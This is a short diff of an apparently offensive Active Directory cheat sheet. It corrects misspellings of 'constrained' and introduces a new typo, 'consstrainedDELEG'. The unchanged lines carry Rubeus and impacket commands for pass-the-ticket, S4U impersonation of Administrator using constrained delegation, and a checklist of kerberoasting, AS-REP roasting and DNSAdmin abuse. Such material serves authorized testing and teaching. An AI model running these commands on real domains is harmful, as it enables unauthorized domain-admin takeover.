@@ -367,9 +367,9 @@ then inject the tgt:
 .\Rubeus.exe ptt /ticket:<ticket>
 ```
   
-# Contrained delegation
+# Constrained delegation
 ### with rubeus
-asktgt for the server/user with contrained delegation:
+asktgt for the server/user with constrained delegation:
 ```
 .\Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<user> /ptt
 ```
@@ -378,9 +378,9 @@ asktgs with previous tgt and impersonate domain admin:
 .\Rubeus.exe s4u /domain:<domain> /impersonateuser:Administrator /msdsspn:"<service>" /ticket:<TGT> /ptt
 ```
 ### with impacket 
-asktgt for the server/user with contrained delegation:
+asktgt for the server/user with constrained delegation:
 ```
-getTGT.py -hashes :<hash> <domain>/<user-with-contrainedDELEG> -dc-ip <ip>
+getTGT.py -hashes :<hash> <domain>/<user-with-consstrainedDELEG> -dc-ip <ip>
 ```
 asktgs with previous tgt and impersonate domain admin:
 ```
@@ -508,7 +508,7 @@ Check SPN -> kerberoasting -> crack offline hash
 
 AS-REPs Roasting -> ASKTGT for the specific user
 
-Find Delegation : Uncontrained / Constrained
+Find Delegation : Unconstrained / Constrained
 
 Check DNSAdmin right
 
